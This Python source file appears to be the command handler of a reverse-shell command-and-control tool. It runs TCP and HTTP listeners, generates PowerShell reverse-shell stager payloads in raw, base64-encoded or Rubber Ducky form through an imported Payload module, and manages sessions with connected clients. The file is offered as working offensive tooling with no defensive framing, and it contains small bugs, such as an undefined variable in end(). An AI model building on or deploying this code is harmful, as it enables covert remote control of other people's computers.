from core.ClientHandler         import *
from core.TextAssets            import *
from core.Payload               import *

class CommandHandler:
        def __init__(self) -> None:
                self.tcp_server         = None
                self.http_server        = None
                self.commands           = {
                        "start" : {
                                "min_args" : 3,
                                "max_args" : 4,
                                "function" : self.start,
                                "descript" : """ \r start [service] [+] : Starts a service with given optional
                                                 \r                       parameters.
                                                 \r                       Ex:
                                                 \r                       start [tcp_handler|http_handler] \\
                                                 \r                       [bind_address] [bind_port]
                                """
                        },
                        "kill" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.stop,
                                "descript" : """ \r stop [service]      : Stops a service given. Does not
                                                 \r                       terminate any connection that are
                                                 \r                       currently held with service.
                                                 \r                       Ex:
                                                 \r                       stop [tcp_handler|http_handler]
                                """
                        },
                        "generate" : {
                                "min_args" : 1,
                                "max_args" : 2,
                                "function" : self.generate,
                                "descript" : """ \r generate [+]        : Generates a powershell reverse shell
                                                 \r                       stager payload by default.
                                                 \r                       Ex:
                                                 \r                       generate [tcp] [raw|encode]
                                                 \r                       generate [http] [raw|encode]
                                                 \r                       generate [ducky]
                                """
                        },
                        "options" : {
                                "min_args" : 0,
                                "max_args" : 1,
                                "function" : self.jobs,
                                "descript" : """ \r options             : Displays current settings for services
                                                 \r                       while running, or going to be run.
                                """
                        },
                        "session" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.session,
                                "descript" : """ \r session [+]         : Lets communication with a given client.
                                                 \r                       The client is identified via client ID.
                                """
                        },
                        "sessions" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.sessions,
                                "descript" : """ \r sessions            : Lists all currently connected clients
                                                 \r                       with their respective IDs and IPs.
                                """
                        },
                        "end" : {
                                "min_args" : 1,
                                "max_args" : 1,
                                "function" : self.end,
                                "descript" : """ \r end [+]             : Kills a respective client.
                                """
                        },
                        "eradicate" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.eradicate,
                                "descript" : """ \r eradicate           : Terminates all sessions and kills all
                                                 \r                       services.
                                """
                        },
                        "help" : {
                                "min_args" : 0,
                                "max_args" : 1,
                                "function" : self.get_help,
                                "descript" : """ \r help [+]            : Displays unique help menu to a specific
                                                 \r                       command.
                                """
                        },
                        "clear" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.clear,
                                "descript" : """ \r clear               : Clears the terminal.
                                """
                        },
                        "exit" : {
                                "min_args" : 0,
                                "max_args" : 0,
                                "function" : self.done,
                                "descript" : """ \r exit                : Gracefully destroys services and closes
                                                 \r                       any client connections.
                                """
                        }
                        
                }
                self.callback           = None

        def command(
                self, 
                user_input: str
        ) -> None:
                if not user_input:
                        return

                split_input             = user_input.lower().split()
                command                 = split_input[0]
                arguments               = split_input[1:]

                if not self.validate(command, len(arguments)):
                        return

                self.commands[command]["function"](*arguments)

        def validate(
                self, 
                command: str, 
                number_arguments: int
        ) -> bool:
                if command not in self.commands:
                        debug("Command '{}' does not exist.".format(command))
                        return False

                if number_arguments < self.commands[command]["min_args"]:
                        debug("Command '{}' needs at least {} argument(s).".format(command, str(self.commands[command]["min_args"])))
                        return False

                if number_arguments > self.commands[command]["max_args"]:
                        debug("Command '{}' needs at most {} argument(s).".format(command, str(self.commands[command]["max_args"])))
                        return False

                return True

        def start(
                self, 
                service: str, 
                address: str, 
                port: str, 
                timeout: str = "2000"
        ) -> None:
                services                = {
                        "tcp_handler"   : self.tcp_server,
                        "http_handler"  : self.http_server
                }

                if service not in services:
                        return debug("Server {} does not exist.".format(service))

                if services[service].server.running:
                        return debug("Server already started.")

                services[service].bind_address  = address
                services[service].bind_port     = int(port)
                services[service].timeout       = int(timeout)
                self.http_server.payload        = Payload.tcp(self.callback, str(self.tcp_server.bind_port))

                if not services[service].start():
                        return
                
                success("Server successfully started.")

        def stop(
                self,
                service: str
        ) -> None:
                services                = {
                        "tcp_handler"   : self.tcp_server,
                        "http_handler"  : self.http_server
                }

                if service not in services:
                        return debug("Server {} does not exist.".format(service))
                        
                if not services[service].server.running:
                        return debug("Server already stopped.")
                        
                services[service].kill()
                success("Server successfully stopped.")

        def generate(
                self, 
                payload_type: str = "http",
                payload_form: str = "raw"
        ) -> None:
                info("Generating {} payload...".format(payload_type))

                if payload_type == "ducky":
                        return Payload.ducky(Payload.http(self.callback, str(self.http_server.bind_port)))

                payload_map             = {
                        "tcp"           : Payload.tcp,
                        "http"          : Payload.http,
                        "ducky"         : Payload.ducky
                }
                port_map                = {
                        "tcp"           : self.tcp_server.bind_port,
                        "http"          : self.http_server.bind_port
                }
                encoded_map             = {
                        "encode"        : Payload.base64,
                        "raw"           : Payload.raw
                }
                if payload_type not in payload_map:
                        return debug("Payload type does not exist.".format())

                if payload_form not in encoded_map:
                        return debug("Payload encoding does not exist.".format())

                payload                 = payload_map[payload_type](self.callback, str(port_map[payload_type]))
                payload                 = encoded_map[payload_form](payload)
                print(gray(payload))
        
        def jobs(self) -> None:
                jobs(self.tcp_server, self.http_server)

        def session(
                self, 
                client_identifier: str
        ) -> None:
                client_identifier       = client_identifier.upper()

                if client_identifier not in self.tcp_server.clients:
                        return debug("Client '{}' does not exist.".format(client_identifier))
                        
                client                  = self.tcp_server.clients[client_identifier]

                if client.status == "Lost":
                        return debug("Cannot communicate with a lost client.")

                client_handler          = ClientHandler(client)
                client_handler.set_up()
                client_handler.begin_communication()

        def sessions(self) -> None:
                return sessions(self.tcp_server.clients) if self.tcp_server.clients else info("There are no sessions available.")

        def end(
                self, 
                client_id: str
        ) -> None:
                client_identifier       = client_identifier.upper()
                client                  = self.tcp_server.clients[client_identifier]

                if client_identifier not in self.tcp_server.clients:
                        return debug("Client does not exist.")

                if client.status == "Lost":
                        return debug("Client has exited.")

                client.connection.close()
                client.status           = "Lost"

        def eradicate(self) -> None:
                for client_identifier in self.tcp_server.clients.keys():
                        client          = self.tcp_server.clients[client_identifier]
                        client.status   = "Lost"
                        client.connection.close()

                success("All clients terminated.")

        def get_help(self, command: str = "") -> None:
                if not command:
                        return get_help()
                
                if command not in self.commands:
                        return debug("Command '{}' does not exist.".format(command))

                get_command_help(self.commands[command]["descript"])

        def clear(self = "") -> None:
                sys.stdout.write("\x1B" + "c")

        def done(self) -> None:
                exit()